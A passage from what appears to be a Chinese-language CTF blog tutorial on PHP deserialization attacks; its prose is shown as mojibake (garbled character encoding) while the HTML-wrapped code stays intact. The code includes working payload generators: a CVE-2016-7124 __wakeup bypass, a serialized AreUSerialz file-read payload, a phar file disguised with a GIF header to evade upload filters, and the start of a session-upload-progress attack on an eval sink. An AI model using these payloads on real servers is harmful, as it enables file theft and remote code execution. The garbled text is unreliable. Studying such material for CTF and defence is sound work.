class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé¦–å…ˆæœ‰ä¸¤ä¸ªè¦ç»•è¿‡çš„ç‚¹</p>
<p>ç¬¬ä¸€ä¸ªç‚¹æ˜¯<code>__wakeup()</code>ï¼Œå› ä¸ºè¿™é‡Œæ­£å¸¸ååºåˆ—åŒ–ä¼šå†™æ­»<code>$this-&gt;ï¬le</code>å±æ€§ä¸º index.phpï¼Œä½†æ˜¯phpå­˜åœ¨è¿™ä¹ˆä¸€ä¸ªæ¼æ´ï¼ˆCVE-2016-7124ï¼‰ï¼Œå½“å®é™…å¯¹è±¡ä¸ç­‰äºååºåˆ—åŒ–çš„å¯¹è±¡æ•°æ—¶å€™ä¼šè¿‡<code>wakeup()</code>ã€‚</p>
<p>ç¬¬äºŒä¸ªç‚¹æ˜¯æ­£åˆ™åŒ¹é…ï¼Œè¿™é‡Œçš„æ­£åˆ™åŒ¹é…çš„æ„æ€æ˜¯å¦‚æœåœ¨varå˜é‡ä¸­å­˜åœ¨O/C:æ•°å­—(O:æ•°å­—æˆ–è€…C:æ•°å­—è¿™æ ·çš„å½¢å¼)å°±dieæ‰ï¼Œè¿™é‡ŒåŒ¹é…çš„æ˜¯<code>O:4</code>ï¼Œç›´æ¥ä½¿ç”¨+å·å½“åšç©ºæ ¼å³å¯ç»•è¿‡ï¼Œå³<code>O:+4</code>å³å¯ç»•è¿‡ã€‚</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$a = serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,$a);</span><br><span class="line">$a  =  str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>

<h3 id="ç§æœ‰å±æ€§ç»•è¿‡"><a href="#ç§æœ‰å±æ€§ç»•è¿‡" class="headerlink" title="ç§æœ‰å±æ€§ç»•è¿‡"></a><strong>ç§æœ‰å±æ€§ç»•è¿‡</strong></h3><p>é¦–å…ˆæ¥çœ‹çœ‹è¿™æ ·ä¸€æ®µä»£ç </p>
<img src="http://img.kawhi.xyz/image-20200711220816401.png" style="high:70%;width:70%;" />

<p>è¿™é‡Œè¦æ³¨æ„</p>
<ul>
<li>privateä¼šåœ¨å±æ€§åå‰é¢äº§ç”Ÿ<code>&lt;0x00&gt;ç±»å&lt;0x00&gt;</code>ï¼Œä¹Ÿå°±æ˜¯<code>%00ç±»å%00</code></li>
<li>protectedä¼šåœ¨å±æ€§åå‰é¢äº§ç”Ÿ<code>&lt;0x00&gt;*&lt;0x00&gt;</code>ï¼Œä¹Ÿå°±æ˜¯<code>%00*%00</code></li>
<li><code>%00</code>å…¶asciiä¸º0</li>
</ul>
<p>é€šè¿‡è¿™ä¸ªé¢˜ç›®ç†è§£ä¸€ä¸‹å¦‚ä½•ç»•è¿‡ç§æœ‰å±æ€§ï¼Œè¿™æ˜¯ä¸€é“ç½‘é¼æ¯é’é¾™ç»„åä¸ºAreUSerialzçš„ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œæºç ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦è¿›è¡Œæ–‡ä»¶è¯»å–æ¥è¯»å–flagã€‚</p>
<p>é¦–å…ˆéœ€è¦ç»•è¿‡<code>is_valid()</code>å‡½æ•°ï¼Œå› ä¸º<code>protected</code>ç±»å‹çš„å±æ€§çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åŒ…å«ä¸å¯è§å­—ç¬¦<code>%00</code>ï¼Œä¼šè¢«<code>is_valid()</code>å‡½æ•°ç»™banæ‰ã€‚</p>
<p>è¿™é‡Œéé¢„æœŸçš„è¯æ˜¯ç›´æ¥ç”¨<code>public</code>å°±å¯ä»¥ç»•è¿‡ï¼Œå› ä¸ºphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿã€‚</p>
<p>é¢„æœŸè§£çš„è¯æ˜¯è®©ç”¨Sæ¥ä»£æ›¿sï¼Œæ­¤æ—¶åé¢çš„å­—ç¬¦ä¸²æ”¯æŒ16è¿›åˆ¶è¡¨ç¤ºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹<code>%00</code>å°±ä¼šè¢«è§£ææˆ<code>\00</code>(3ä¸ªå­—ç¬¦)ï¼Œå› ä¸ºåœ¨<code>is_valid()</code>ä¸­æ˜¯å°†æˆ‘ä»¬åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²é€ä¸ªè½¬ä¸ºasciiç„¶åè¿›è¡Œå¯¹æ¯”ï¼Œè€Œå› æ­¤<code>\00</code>ä¼šè¢«è§£æä¸ºä¸‰ä¸ªå­—ç¬¦ï¼Œä¸”éƒ½åœ¨å…è®¸çš„èŒƒå›´å†…ï¼Œå› æ­¤å¯ä»¥æˆåŠŸç»•è¿‡ã€‚</p>
<p>éœ€è¦ç»•è¿‡ææ„æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºåœ¨è¿›è¡Œ<code>read()</code>ä¹‹å‰å°±ä¼šè°ƒç”¨<code>__destruct()</code>é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœ<code>$this-&gt;op === &quot;2&quot;</code>å°±ä¼šè®¾ç½®<code>$this-&gt;op</code>ä¸º<code>&quot;1&quot;</code>ï¼Œè€Œ<code>&quot;1&quot;</code>æ˜¯ä¸èƒ½è°ƒç”¨<code>read()</code>æ¥æ–‡ä»¶è¯»å–çš„ã€‚å¯ä»¥å‘ç°ï¼š</p>
<ul>
<li><code>__destruct()</code>æ–¹æ³•å†…ä½¿ç”¨äº†ä¸¥æ ¼ç›¸ç­‰<code>$this-&gt;op === &quot;2&quot;</code></li>
<li><code>process()</code>æ–¹æ³•å†…ä½¿ç”¨äº†ä¸ä¸¥æ ¼ç›¸ç­‰<code>else if ($this-&gt;op == &quot;2&quot;)</code></li>
</ul>
<p>æ‰€ä»¥è¿™é‡Œä½¿ç”¨å¼±ç±»å‹<code>2 == &quot;2&quot;</code>ç»•è¿‡å³å¯ã€‚</p>
<p>ç„¶åæ„é€ åºåˆ—åŒ–ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler(<span class="string">&quot;&quot;</span>);</span><br><span class="line">$s = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">&quot;\00&quot;</span>,<span class="string">&#x27;\00&#x27;</span>,$s);</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s:&quot;</span>,<span class="string">&#x27;S:&#x27;</span>,$b);</span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æäº¤å°±èƒ½å¾—åˆ°flagã€‚</p>
<h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a><strong>pharååºåˆ—åŒ–</strong></h3><p>é¦–å…ˆæ¥è®¤è¯†ä¸€ä¸‹ä»€ä¹ˆæ˜¯phar</p>
<p>åœ¨php&gt;=5.3çš„æ—¶å€™ï¼Œé»˜è®¤å¼€å¯æ”¯æŒPharï¼Œæ–‡ä»¶çŠ¶æ€é—®ä¸ºåªè¯»ï¼Œè€Œä¸”ä½¿ç”¨pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•é…ç½®ã€‚phpä½¿ç”¨phar://ä¼ªåè®®æ¥è§£æpharæ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>æ¼æ´äº§ç”Ÿçš„åŸå› </p>
<p>ä½¿ç”¨<code>Phar://</code>ä¼ªåè®®å»è¯»å–Pharæ–‡ä»¶æ—¶å€™ï¼Œæ–‡ä»¶ä¼šè¢«å½“åšpharå¯¹è±¡ï¼Œmeta-dataéƒ¨åˆ†ä¼šè¢«ååºåˆ—åŒ–ã€‚pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataè¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar://ä¼ªåè®®</strong>ï¼Œå¯ä»¥ä¸ä¾èµ–<code>unserialize()</code>ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p>
<p>è¿™é‡Œè´´ä¸€ä¸‹å—å½±å“çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åˆ—è¡¨ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200711232201316.png" style="high:80%;width:80%;" />

<p>ä¸¾ä¸€ä¸ªå°æ —å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ç”Ÿæˆphar æ–‡ä»¶çš„æ ¼å¼</span></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„è¯éœ€è¦æŠŠphp.iniçš„;phar.readonly = Onæ”¹ä¸ºphar.readonly = Offï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200711232430900.png" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸè¾“å‡ºå­—ç¬¦ã€‚å½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œæå¤§çš„æ‹“å±•äº†æ”»å‡»é¢ã€‚</p>
<p><strong>pharçš„ä¼ªé€ </strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„phar.pharæ ¼å¼æ˜¯gifæ–‡ä»¶ï¼Œèƒ½å¤Ÿç»•è¿‡å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¼ æ£€æµ‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">D:\phpStudy\PHPTutorial\WWW</span><br><span class="line">Î» file phar.phar</span><br><span class="line">phar.phar: GIF image data, version <span class="number">89</span>a, <span class="number">16188</span> x <span class="number">26736</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨çš„æ¡ä»¶</p>
<ul>
<li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li>
<li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€è·³æ¿â€ã€‚</li>
<li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</li>
</ul>
<h3 id="SESSIONååºåˆ—åŒ–"><a href="#SESSIONååºåˆ—åŒ–" class="headerlink" title="SESSIONååºåˆ—åŒ–"></a><strong>SESSIONååºåˆ—åŒ–</strong></h3><p>åŸºæœ¬çŸ¥è¯†</p>
<p>é¦–å…ˆè¦çŸ¥é“æ˜¯PHP session çš„å¼•æ“çš„å·®å¼‚, è¿™ä¹Ÿæ˜¯å¯¼è‡´è¿™ä¸ªæ¼æ´çš„æ ¹æœ¬åŸå› å’Œåˆ©ç”¨æ¡ä»¶</p>
<p><strong>PHP session çš„å­˜å‚¨æœºåˆ¶</strong></p>
<ul>
<li>session.serialize_handler ä¸‰ç§å¼•æ“</li>
</ul>
<table>
<thead>
<tr>
<th align="left">å¤„ç†å™¨åç§°</th>
<th>å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td align="left">php</td>
<td>é”®å + ç«–çº¿ + ç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td align="left">php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td align="left">php_serialize</td>
<td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</td>
</tr>
</tbody></table>
<p>è¿™é‡Œé€šè¿‡ä¸€é“æ¥è‡ªæµ™å¤§çš„é¢˜ç›®æ¥ç†è§£è¿™ä¸ªçŸ¥è¯†ç‚¹</p>
<p>é¢˜ç›®åœ°å€ï¼š<a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784</a></p>
<p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€çœ¼çœ‹è§‰å¾—æ¯”è¾ƒç®€å•</p>
<p>å½“åˆ›å»º<code>OowoO()</code>è¿™ä¸ªç±»çš„å¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨<code>__construct()</code>è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œç»™mdzzè¿™ä¸ªå˜é‡èµ‹å€¼ä¸ºphpinfo()ï¼Œç„¶åç¨‹åºæ‰§è¡Œç»“æŸåä¼šè‡ªåŠ¨è°ƒç”¨<code>__destruct</code>è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œè§¦å‘äº†<code>eval()</code>ï¼Œä½†é—®é¢˜å°±æ˜¯æ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°å•Šã€‚</p>
<p>ç„¶åçœ‹åˆ°é¢˜ç›®ä¸­æœ‰è¿™ä¸ªä¸œè¥¿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>è€ƒè™‘åˆ°å¯èƒ½æ˜¯åºåˆ—åŒ–å¼•æ“ä¸åŒå¯¼è‡´çš„sessionååºåˆ—æ¼æ´</p>
<p>ç„¶åæŸ¥çœ‹ä¸€ä¸‹phpinfoçš„ä¿¡æ¯</p>
<img src="http://img.kawhi.xyz/image-20200711211409836.png" style="high:80%;width:80%;" />

<p>å‘ç°å­˜å‚¨å’Œè¯»å–sessionæ—¶ç”¨åˆ°çš„å¤„ç†å™¨å¼•æ“ä¸ä¸€æ ·ã€‚</p>
<p>ç°åœ¨æœ‰ä¸ªé—®é¢˜ï¼Œsessionæ˜¯æ€ä¹ˆä¼ è¿›å»çš„å‘¢ï¼Œå¹³æ—¶éƒ½æ˜¯æœ‰ä¸ª<code>$_SESSION=$_GET[&#39;a&#39;]</code>ï¼Œé€šè¿‡å‚æ•°aä¼ è¿›å»ï¼Œæœ¬é¢˜æ²¡æœ‰$_SESSIONè¿›è¡Œå˜é‡èµ‹å€¼ï¼Œè¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥ç”¨phpæ–‡ä»¶ä¸Šä¼ è¿›åº¦æ¥è§£å†³ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">å½“åœ¨php.iniä¸­è®¾ç½®session.upload_progress.enabled = Onçš„æ—¶å€™ï¼ŒPHPå°†èƒ½å¤Ÿè·Ÿè¸ªä¸Šä¼ å•ä¸ªæ–‡ä»¶çš„ä¸Šä¼ è¿›åº¦ã€‚å½“ä¸Šä¼ æ­£åœ¨è¿›è¡Œæ—¶ï¼Œä»¥åŠåœ¨å°†ä¸session.upload_progress.name INIè®¾ç½®ç›¸åŒçš„åç§°çš„å˜é‡è®¾ç½®ä¸ºPOSTæ—¶ï¼Œä¸Šä¼ è¿›åº¦å°†åœ¨$ _SESSIONè¶…å…¨å±€ä¸­å¯ç”¨ã€‚</span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200711211709331.png" style="high:80%;width:80%;" />

<p>session.upload_progress.enabledåˆšå¥½éƒ½æ˜¯å¼€å¯çš„ã€‚æˆ‘ä»¬å¯ç”¨äº†è¯¥é…ç½®é¡¹åï¼ŒPOSTä¸€ä¸ªå’Œsession.upload_progress.nameåŒåå˜é‡çš„æ—¶å€™ï¼ŒPHPä¼šå°†æ–‡ä»¶åä¿å­˜åœ¨$_SESSIONä¸­ã€‚</p>
<p>äºæ˜¯è¿™é‡Œæˆ‘ä»¬æ„é€ è¡¨å•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;form action =<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method =<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;input type =<span class="string">&quot;hidden&quot;</span> name =<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value =<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;input type =<span class="string">&quot;file&quot;</span> name =<span class="string">&quot;file&quot;</span>/&gt;</span><br><span class="line">&lt;input type =<span class="string">&quot;submit&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€æ„é€ ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®</p>
